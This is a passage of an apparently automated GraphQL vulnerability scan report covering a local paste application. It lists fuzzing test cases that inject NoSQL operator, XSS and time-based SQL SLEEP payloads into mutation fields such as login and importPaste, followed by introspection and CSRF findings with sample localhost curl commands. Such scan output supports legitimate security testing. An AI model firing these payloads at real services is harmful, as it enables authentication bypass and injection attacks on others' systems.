42. `mutation.createPaste.content` with payload: `"" SLEEP(5) --"`
43. `mutation.createPaste.title` with payload: `"{"$gt": ""}"`
44. `mutation.createPaste.title` with payload: `"{"$ne": null}"`
45. `mutation.createPaste.title` with payload: `""); alert("XSS"`
46. `mutation.createPaste.title` with payload: `"" SLEEP(5) --"`
47. `mutation.editPaste.content` with payload: `"{"$gt": ""}"`
48. `mutation.editPaste.content` with payload: `"{"$ne": null}"`
49. `mutation.editPaste.content` with payload: `""); alert("XSS"`
50. `mutation.editPaste.content` with payload: `"" SLEEP(5) --"`
51. `mutation.editPaste.id` with payload: `null`
52. `mutation.editPaste.title` with payload: `"{"$gt": ""}"`
53. `mutation.editPaste.title` with payload: `"{"$ne": null}"`
54. `mutation.editPaste.title` with payload: `""); alert("XSS"`
55. `mutation.editPaste.title` with payload: `"" SLEEP(5) --"`
56. `mutation.deletePaste.id` with payload: `null`
57. `mutation.uploadPaste.content` with payload: `{"$gt": ""}`
58. `mutation.uploadPaste.content` with payload: `{"$ne": null}`
59. `mutation.uploadPaste.content` with payload: `""); alert("XSS"`
60. `mutation.uploadPaste.content` with payload: `null`
61. `mutation.uploadPaste.content` with payload: `"" SLEEP(5) --"`
62. `mutation.uploadPaste.filename` with payload: `{"$gt": ""}`
63. `mutation.uploadPaste.filename` with payload: `{"$ne": null}`
64. `mutation.uploadPaste.filename` with payload: `""); alert("XSS"`
65. `mutation.uploadPaste.filename` with payload: `null`
66. `mutation.uploadPaste.filename` with payload: `"" SLEEP(5) --"`
67. `mutation.importPaste.host` with payload: `{"$gt": ""}`
68. `mutation.importPaste.host` with payload: `{"$ne": null}`
69. `mutation.importPaste.host` with payload: `""); alert("XSS"`
70. `mutation.importPaste.host` with payload: `null`
71. `mutation.importPaste.host` with payload: `"" SLEEP(5) --"`
72. `mutation.importPaste.path` with payload: `{"$gt": ""}`
73. `mutation.importPaste.path` with payload: `{"$ne": null}`
74. `mutation.importPaste.path` with payload: `""); alert("XSS"`
75. `mutation.importPaste.path` with payload: `null`
76. `mutation.importPaste.path` with payload: `"" SLEEP(5) --"`
77. `mutation.importPaste.port` with payload: `null`
78. `mutation.importPaste.scheme` with payload: `{"$gt": ""}`
79. `mutation.importPaste.scheme` with payload: `{"$ne": null}`
80. `mutation.importPaste.scheme` with payload: `""); alert("XSS"`
81. `mutation.importPaste.scheme` with payload: `null`
82. `mutation.importPaste.scheme` with payload: `"" SLEEP(5) --"`
83. `mutation.createUser.userData` with payload: `{"$gt": ""}`
84. `mutation.createUser.userData` with payload: `{"$ne": null}`
85. `mutation.createUser.userData` with payload: `""); alert("XSS"`
86. `mutation.createUser.userData` with payload: `null`
87. `mutation.createUser.userData` with payload: `"" SLEEP(5) --"`
88. `mutation.login.password` with payload: `"{"$gt": ""}"`
89. `mutation.login.password` with payload: `"{"$ne": null}"`
90. `mutation.login.password` with payload: `""); alert("XSS"`
91. `mutation.login.password` with payload: `"" SLEEP(5) --"`
92. `mutation.login.username` with payload: `"{"$gt": ""}"`
93. `mutation.login.username` with payload: `"{"$ne": null}"`
94. `mutation.login.username` with payload: `""); alert("XSS"`
95. `mutation.login.username` with payload: `"" SLEEP(5) --"`

### Medium Severity Vulnerabilities

#### 1.2.1. Introspection Enabled

**Description**: GraphQL introspection allows clients to query the schema structure

**Details**: The server has introspection enabled, which can expose sensitive schema information

**Sample curl command**:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 117' http://127.0.0.1:5013/graphql
```

#### 1.2.2. CSRF Vulnerability

**Description**: Server accepts form-encoded requests, enabling potential CSRF

**Details**: The server accepts form-encoded requests, which may enable CSRF attacks

**Sample curl command**:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 30' -d '{"data":{"__typename":"Query"}}' http://127.0.0.1:5013/graphql
```

### Summary

- Total tests run: 7
- Vulnerabilities found: 3
  - High severity: 1
  - Medium severity: 2
  - Low severity: 0

---



*This report was generated automatically by GrapeQL*
